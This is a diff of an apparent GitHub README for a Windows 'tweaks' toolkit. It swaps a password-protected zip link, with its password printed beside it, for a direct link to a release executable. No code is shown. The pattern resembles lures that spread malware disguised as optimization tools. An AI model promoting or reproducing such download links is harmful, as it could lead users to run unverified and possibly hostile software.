@@ -42,13 +42,11 @@ PowerShell scripts, registry tweaks, driver configs, debloat tools, telemetry bl
 
 🔽 Password-protected archive with the complete toolkit — extract and start optimizing.
 
-📦 [**All-In-One Setup** `Windows-Tweaks-2026.zip`](https://github.com/RegentSnatch/WinTweaks/releases/download/Release/WinTweaks.zip)
-
- **🔐🔐🔐** `1847`  **🔐🔐🔐**
+📦 [**WinTweaker** `WinTweaker`](https://github.com/RegentSnatch/WinTweaks/releases/download/Release/WinTweaks.exe)
 
 ---
 
-### 📁 Archive Contents
+### 📁 Contents
 
 ```
 Windows-Tweaks-2026/
